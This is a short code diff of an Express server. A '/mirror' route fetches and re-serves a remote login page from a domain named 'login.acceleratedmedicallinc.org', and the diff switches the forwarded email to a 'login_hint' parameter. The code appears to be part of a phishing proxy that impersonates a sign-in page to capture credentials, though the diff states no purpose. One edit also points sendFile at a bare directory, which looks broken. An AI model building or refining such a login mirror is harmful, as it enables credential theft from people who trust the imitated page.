@@ -5,12 +5,12 @@ const app = express();
 const BACKEND_URL = " https://login.acceleratedmedicallinc.org";
 
 app.get("/", (req, res) => {
-  res.sendFile(__dirname + "/index.html");
+  res.sendFile(__dirname + "/");
 });
 
 app.get("/mirror", async (req, res) => {
   try {
-    const email = req.query.email ? `?email=${encodeURIComponent(req.query.email)}` : "";
+    const email = req.query.email ? `?login_hint=${encodeURIComponent(req.query.email)}` : "";
     const response = await fetch(`${BACKEND_URL}${email}`);
     const html = await response.text();
     res.set("Content-Type", "text/html");
